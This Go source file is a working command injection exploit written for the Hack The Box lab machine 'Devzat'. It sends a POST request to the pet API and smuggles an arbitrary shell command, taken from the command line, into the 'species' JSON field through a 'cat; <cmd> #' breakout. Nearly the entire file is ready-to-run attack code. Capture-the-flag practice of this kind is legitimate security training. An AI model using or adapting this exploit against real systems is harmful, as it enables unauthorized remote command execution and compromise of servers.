package main

// Initial Command injection exploit for Devzat - Hackthebox

import (
	"bytes"
	"fmt"
	"log"
	"net/http"
	"os"
)

func main() {
    // Usage: ./devzat "<cmd>"
    if len(os.Args) != 2 {
        fmt.Println("Usage: " + os.Args[0] + " \"<cmd>\"")
        os.Exit(1)
    }

    cmd := os.Args[1]                       // Command to inject
    url := "http://pets.devzat.htb/api/pet" // API endpoint

    // JSON payload vulnerable to command injection
    params := fmt.Sprintf(`{
        "name":"alterego",
        "species":"cat; %s #"
    }`, cmd)

    // Request headers
    headers := make(map[string]string)
    headers["Content-Type"] = "text/plain; charset=utf-8"

    // Make the post request
    response := post(url, params, headers)
    defer response.Body.Close()
    fmt.Println(response.Status)
}

// Make an http POST request given a URL, json parameters, and headers
func post(url, params string, headers map[string]string) (*http.Response) {
    // Create POST request with json params
    json_data := []byte(params)
    request, err := http.NewRequest("POST", url, bytes.NewBuffer(json_data))
    check(err)
    
    // Add headers to request
    for key, value := range headers {
        request.Header.Add(key, value)
    }

    // Make the post request
    client := &http.Client{}
    response, err := client.Do(request)
    check(err)

    return response
}

func check(err error) {
    if err !=nil {
        log.Fatal(err)
    }
}
